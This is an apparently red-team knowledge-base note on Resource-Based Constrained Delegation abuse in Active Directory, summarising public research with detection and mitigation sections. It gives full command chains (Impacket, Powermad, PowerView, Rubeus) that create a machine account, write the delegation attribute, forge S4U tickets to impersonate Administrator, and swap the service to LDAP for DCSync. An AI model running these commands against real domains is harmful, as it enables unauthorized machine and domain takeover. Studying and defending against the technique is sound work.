---
title: Resource-Based Constrained Delegation (RBCD)
aliases: ["RBCD", "Resource-Based Constrained Delegation", "msDS-AllowedToActOnBehalfOfOtherIdentity"]
type: concept
domain: [active-directory]
tags: [type/concept, domain/active-directory, proto/kerberos, attack/privesc]
source: ["[[Source - zer1t0 - Attacking Active Directory]]", "[[Source - harmj0y blog]]", "[[Source - hackndo blog]]"]
source_url: "https://zer1t0.gitlab.io/posts/attacking_ad/"
verified: true
related: ["[[Kerberos Delegation]]", "[[Constrained Delegation]]", "[[Computer Accounts]]", "[[ACL Abuse]]", "[[NTLM Relay]]", "[[Rubeus]]", "[[PowerView]]", "[[DCSync]]", "[[Silver Ticket]]"]
created: 2026-06-06
updated: 2026-06-07
---

# Resource-Based Constrained Delegation (RBCD)

> [!summary] One-liner
> Delegation configured on the *resource* side: if you can write one attribute on a target computer, you can impersonate any user to it.

## How it works
Unlike [[Constrained Delegation]] (set on the *front-end*), RBCD is set **on the target resource** via **`msDS-AllowedToActOnBehalfOfOtherIdentity`**, which lists who may impersonate users **to it**. Whoever is listed can run S4U2self+S4U2proxy against the target.

## The attack (very common privesc)
1. Get an account **with an SPN** you control — often by **creating a computer object** (default `MachineAccountQuota = 10` lets any user add up to 10).
2. Get **write access** to the target computer object (`GenericWrite`/`GenericAll` via [[ACL Abuse]], or via [[NTLM Relay]] to LDAP).
3. Set the target's `msDS-AllowedToActOnBehalfOfOtherIdentity` to your controlled account.
4. **S4U** to impersonate Administrator to the target → admin access.

```bash
# Impacket
addcomputer.py -computer-name 'EVIL$' -computer-pass 'Passw0rd!' contoso.local/user:pass
rbcd.py -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write contoso.local/user:pass
getST.py -spn cifs/target.contoso.local -impersonate Administrator contoso.local/EVIL\$:'Passw0rd!'
```
```powershell
# Rubeus (after setting the attribute)
Rubeus.exe s4u /user:EVIL$ /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/target /ptt
```

## Why a red teamer cares
RBCD turns a single **write permission** on a computer object into **full compromise of that machine** — a favorite outcome of [[ACL Abuse]] and [[NTLM Relay]] chains.

## More from harmj0y ("Wagging the Dog" — computer takeover)
harmj0y's write-up of Elad Shamir's research turns the RBCD primitive into a clean, fully-Windows computer-takeover chain. Key technical points that extend the section above:

### Why S4U works even without delegation flags set
- This is the crux that makes RBCD abuse so general. When you run **S4U2self** for an account that does **NOT** have `TrustedToAuthForDelegation` (i.e. it isn't configured for protocol transition), S4U2self **still works**, but the resulting TGS is **not `FORWARDABLE`**.
- A non-forwardable ticket **fails** in classic [[Constrained Delegation]] (which requires forwardable tickets for S4U2proxy). But for **resource-based** constrained delegation, that **non-forwardable S4U2self ticket still works in S4U2proxy**. So any account you control that simply has an SPN can drive the impersonation — no special delegation flags needed on the front-end account.

### MachineAccountQuota gives you the SPN-bearing account for free
- `MachineAccountQuota` defaults to **10**, so any regular domain user can create up to ten machine accounts. A freshly created computer object automatically receives **default SPNs**, satisfying the "account with an SPN" prerequisite — you don't need to already control an SPN-bearing principal.
- Created via **Powermad** (`New-MachineAccount`, Kevin Robertson).

### sname substitution — impersonate to ANY service
- The service name (`sname`) in the S4U2proxy request can be **swapped to any service** on the target without changing the delegation config. harmj0y shows requesting `cifs/...` for file access, then notes that against a DC you can simply change `/msdsspn:cifs/primary.testlab.local` to `/msdsspn:ldap/primary.testlab.local` to enable [[DCSync]] instead. "We can execute this for any service name (sname) we'd like to abuse." (Conceptually identical to the sname-rewrite trick behind [[Silver Ticket]] reuse.)

### Prerequisites (harmj0y's lab)
- `GenericWrite` (or `GenericAll` / `WriteOwner`) on the **target computer object**.
- Ability to create a machine account (`MachineAccountQuota >= 1`).
- **At least one 2012+ domain controller** in the domain — RBCD support requires it. Pure 2008-DC domains cannot be abused this way.

### Full end-to-end commands (PowerView + Powermad + Rubeus)
```powershell
# 1) Create an SPN-bearing computer account (Powermad)
New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)

# 2) Build a security descriptor granting the new account's SID, set it on the target (PowerView)
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# 3) (Verify the descriptor was written correctly)
$RawBytes = Get-DomainComputer $TargetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
$Descriptor.DiscretionaryAcl

# 4) Compute the RC4_HMAC (NT) hash of the machine account password (Rubeus)
.\Rubeus.exe hash /password:Summer2018! /user:attackersystem /domain:testlab.local

# 5) S4U2self + S4U2proxy, impersonate a target user, inject ticket (Rubeus)
.\Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:harmj0y /msdsspn:cifs/primary.testlab.local /ptt

# 6) Use the access (e.g. DCSync if you swapped sname to ldap/...)
dir \\primary.testlab.local\C$

# 7) Cleanup — clear the attribute (PowerView)
Get-DomainComputer $TargetComputer | Set-DomainObject -Clear 'msds-allowedtoactonbehalfofotheridentity'
```
> Note on the security descriptor: harmj0y notes he "couldn't quite figure out all of the nuances of its structure," so the workflow extracts a template SDDL, substitutes the attacker-controlled SID, and converts it back to its binary (`byte[]`) form for storage in `msds-allowedtoactonbehalfofotheridentity`.

### Detection / artifacts (from this chain)
- **New machine account creation** by a non-admin user (Security Event **4741**, "A computer account was created").
- **Modification of `msDS-AllowedToActOnBehalfOfOtherIdentity`** on a computer object (directory-object-change auditing / **5136**) — a high-signal indicator; legitimate changes are rare.
- **S4U2self / S4U2proxy TGS requests** on the DC (Kerberos service ticket events **4769**) for the target services. [UNVERIFIED — specific event-ID guidance is not enumerated in the post itself.] #status/unverified

### Mitigation
- Lower or zero out **`MachineAccountQuota`** so ordinary users cannot create machine accounts.
- Tightly control **write ACLs** (`GenericWrite`/`GenericAll`/`WriteOwner`) on computer objects.
- Place sensitive accounts in **Protected Users** and/or mark them "**Account is sensitive and cannot be delegated**" so they cannot be impersonated via delegation. [UNVERIFIED — this protection is not discussed in this particular post.] #status/unverified

## Non-forwardable ticket acceptance (hackndo)
This is the core technical reason RBCD attacks work even without `TrustedToAuthForDelegation` on the attacker's account. In classic [[Constrained Delegation]], S4U2Proxy requires a **forwardable** TGS. In RBCD, the critical difference is that **non-forwardable tickets are still accepted** by the KDC when processing S4U2Proxy requests:

- **S4U2Self returns a non-forwardable TGS** because the attacker's machine account does not have the `TrustedToAuthForDelegation` flag set — it is not configured for protocol transition.
- But when this non-forwardable ticket is presented in **S4U2Proxy**, the DC validates it against the target's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute and **still issues a valid service ticket**.
- This is the core reason RBCD attacks work even without `TrustedToAuthForDelegation` — the resource-based model intentionally relaxes the forwardable-ticket requirement.

### Practical attack chain (hackndo)
1. **Create a machine account** (using Powermad):
```powershell
New-MachineAccount -MachineAccount NEWMACHINE -Password $(ConvertTo-SecureString "Hackndo123+!" -AsPlainText -Force)
```
2. **Modify target's trust attribute** — write the new machine account's SID into the target's `msDS-AllowedToActOnBehalfOfOtherIdentity`.
3. **S4U2Self** — request a TGS to the attacker's machine account on behalf of a privileged user. The ticket comes back **non-forwardable** (no `TrustedToAuthForDelegation`).
4. **S4U2Proxy** — present the non-forwardable TGS to request a service ticket to the target. The DC checks `msDS-AllowedToActOnBehalfOfOtherIdentity`, finds the attacker's machine account listed, and **issues a forwardable TGS for the target service**.
5. **Use the ticket** — inject and access the target (e.g. `cifs/target` for file access, `ldap/dc` for [[DCSync]]).

## Related
- [[Kerberos Delegation]], [[Constrained Delegation]], [[Unconstrained Delegation]], [[Computer Accounts]], [[ACL Abuse]], [[NTLM Relay]], [[Rubeus]], [[PowerView]], [[DCSync]], [[Silver Ticket]]

## Sources
- [[Source - zer1t0 - Attacking Active Directory]] — "Kerberos Constrained Delegation" (resource-based variant)
- [[Source - harmj0y blog]] — "A Case Study in Wagging the Dog: Computer Takeover" — https://blog.harmj0y.net/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/ (demo gist: https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff)
- [[Source - hackndo blog]] — Resource-Based Constrained Delegation (RBCD) — non-forwardable ticket acceptance and practical attack chain
